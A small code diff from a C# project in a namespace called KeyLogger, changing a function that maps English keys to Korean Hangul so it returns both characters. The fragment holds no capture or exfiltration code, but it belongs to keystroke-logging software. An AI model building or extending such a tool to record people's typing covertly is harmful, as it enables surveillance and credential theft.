@@ -146,7 +146,7 @@ namespace KeyLogger
 
             // 영문 → 한글 자판 매핑
             if (result.Length == 1 && _engToKor.ContainsKey(result[0]))
-                return _engToKor[result[0]].ToString();
+                return result[0] + " " + "한글:" + _engToKor[result[0]].ToString();
 
             return result;
         }
